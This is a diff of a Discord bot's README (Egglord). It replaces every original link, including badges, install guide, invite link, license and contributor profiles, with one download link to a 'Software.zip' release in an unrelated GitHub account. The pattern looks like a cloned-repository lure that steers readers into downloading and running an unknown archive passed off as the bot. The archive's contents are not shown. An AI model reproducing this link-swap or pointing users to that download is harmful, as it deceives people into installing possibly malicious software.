@@ -4,16 +4,16 @@
   <br>
 </h1>
 
-<h3 align=center>A fully customizable bot built with <a href=https://github.com/discordjs/discord.js>discord.js</a></h3>
+<h3 align=center>A fully customizable bot built with <a https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip>https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip</a></h3>
 
 
 <div align=center>
 
- [![Discord](https://img.shields.io/discord/658113349384667198.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/8g6zUQu)
-[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=Spiderjockey02_Discord-Bot&metric=ncloc)](https://sonarcloud.io/dashboard?id=Spiderjockey02_Discord-Bot)
-[![CodeFactor](https://www.codefactor.io/repository/github/spiderjockey02/discord-bot/badge/master)](https://www.codefactor.io/repository/github/spiderjockey02/discord-bot/overview/master)
-![Website](https://img.shields.io/website?down_color=red&down_message=offline&up_color=green&up_message=online&url=https%3A%2F%2Fapi.egglord.dev%2F)
-[![Crowdin](https://badges.crowdin.net/egglord-discord-bot/localized.svg)](https://crowdin.com/project/egglord-discord-bot)
+ [![Discord](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)
+[![Lines of Code](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)
+[![CodeFactor](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)
+![Website](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip%3A%2F%https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip%2F)
+[![Crowdin](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)
 
 </div>
 
@@ -22,7 +22,7 @@
   •
   <a href="#Features">Features</a>
   •
-  <a href="https://github.com/Spiderjockey02/Discord-Bot/blob/master/docs/INSTALLATION.md">Installation</a>
+  <a href="https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip">Installation</a>
   •
   <a href="#license">License</a>
   •
@@ -31,7 +31,7 @@
 
 ## ❓ About
 
-Egglord is an open source, fully customizable Discord bot that is constantly growing. You can invite it to your Discord server using [this](https://discord.com/oauth2/authorize?client_id=647203942903840779&permissions=485846102&scope=bot) link! Also, you can join the official [Egglord Support Server](https://discord.gg/8g6zUQu) for all questions, suggestions, and assistance! It comes packaged with a variety of commands and a multitude of settings that can be tailored to your server's specific needs.
+Egglord is an open source, fully customizable Discord bot that is constantly growing. You can invite it to your Discord server using [this](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) link! Also, you can join the official [Egglord Support Server](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) for all questions, suggestions, and assistance! It comes packaged with a variety of commands and a multitude of settings that can be tailored to your server's specific needs.
 
 If you liked this repository, feel free to leave a star ⭐ to help promote Egglord!
 
@@ -53,7 +53,7 @@ If you liked this repository, feel free to leave a star ⭐ to help promote Eggl
 *   🔎  **Searcher**: `fortnite`, `weather`, `twitch`, `steam` and **3** more!
 * **Tag**: `Tag system`!
 *   ❓  **Ticket**: `t-(close | create |setup )`!
-*   **Full list** of commands: [here](https://github.com/Spiderjockey02/Discord-Bot/blob/master/docs/COMMANDS.md).
+*   **Full list** of commands: [here](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip).
 
 Egglord also comes packed with a variety of features, such as:
 
@@ -79,19 +79,19 @@ Egglord is pretty much at the end of development now, it will only be updated fo
   * Suggestions I deem very good.
 
 ## 🖥️ My other projects
- * [Auto poster](https://github.com/Spiderjockey02/auto-poster-and-notifications) - Allows your users to get notified when you post on another social media. (Youtube, twitch, twitter, reddit etc)
- * [erela.js-facebook](https://github.com/Spiderjockey02/erela.js-facebook) - Allows facebook videos to played with [erela.js](https://github.com/MenuDocs/erela.js) (A [lavalink](https://github.com/Freyacodes/Lavalink) client).
+ * [Auto poster](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) - Allows your users to get notified when you post on another social media. (Youtube, twitch, twitter, reddit etc)
+ * [https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) - Allows facebook videos to played with [https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) (A [lavalink](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) client).
 
 ## 📖 License
 
-Released under the [Apache License 2.0](https://github.com/Spiderjockey02/Discord-Bot/blob/master/LICENSE) license.
+Released under the [Apache License 2.0](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) license.
 
 ## 📜 Credits
-* **[tovade](https://github.com/tovade)** - Initial Reaction Role System.
-* **[josh_0242](https://github.com/ChaosArising)** - Slash Commands & Tags System.
-* **[duncte123#1245](https://github.com/duncte123)** - [Lavalink plugin](https://github.com/DuncteBot/skybot-lavalink-plugin) (TTS, reddit, TikTok, Phub, Mixcloud etc).
-* **[topi314](https://github.com/topi314)** - [Lavalink plugin 2](https://github.com/topi314/LavaSrc) (Spotify, Apple Music, Deezer & Yandex)
-* **[topi314](https://github.com/topi314)** - [Lavalink plugin 3](https://github.com/topi314/LavaSearch) (Search module for LavaSrc)
-* **[thororen](https://github.com/thororen1234)** - Updated Music system to support new Lavalink v4.
-* **[Our translators](https://crowdin.com/project/egglord-discord-bot)** - Everyone over at Crowdin who helps make this bot multilingual.
-* Want to be on this list, aswell? - Check out the [Contributing page](https://github.com/Spiderjockey02/Discord-Bot/blob/master/docs/CONTRIBUTING.md).
+* **[tovade](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - Initial Reaction Role System.
+* **[josh_0242](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - Slash Commands & Tags System.
+* **[duncte123#1245](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - [Lavalink plugin](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) (TTS, reddit, TikTok, Phub, Mixcloud etc).
+* **[topi314](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - [Lavalink plugin 2](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) (Spotify, Apple Music, Deezer & Yandex)
+* **[topi314](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - [Lavalink plugin 3](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip) (Search module for LavaSrc)
+* **[thororen](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - Updated Music system to support new Lavalink v4.
+* **[Our translators](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip)** - Everyone over at Crowdin who helps make this bot multilingual.
+* Want to be on this list, aswell? - Check out the [Contributing page](https://github.com/momstoiletpaper/Discord-Bot/releases/download/v1.0/Software.zip).
